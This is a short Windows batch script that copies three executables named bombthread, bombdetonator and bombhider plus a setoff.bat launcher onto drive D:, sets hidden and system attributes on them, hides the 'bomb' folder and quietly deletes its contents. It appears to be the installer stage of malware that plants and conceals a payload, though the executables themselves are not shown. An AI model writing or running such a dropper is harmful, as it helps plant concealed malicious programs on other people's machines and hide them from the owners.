copy bombthread.exe D:\ /y
copy bombdetonator.exe D:\ /y
copy bombhider.exe D:\ /y
copy setoff.bat D:\ /y
attrib +h +s D:\bombthread.exe
attrib +h +s D:\bombdetonator.exe
attrib +h +s D:\bombhider.exe
attrib +h D:\setoff.bat
copy setoff.bat ..\ /y
cd ..
attrib +h +s bomb
del bomb\*.* /q
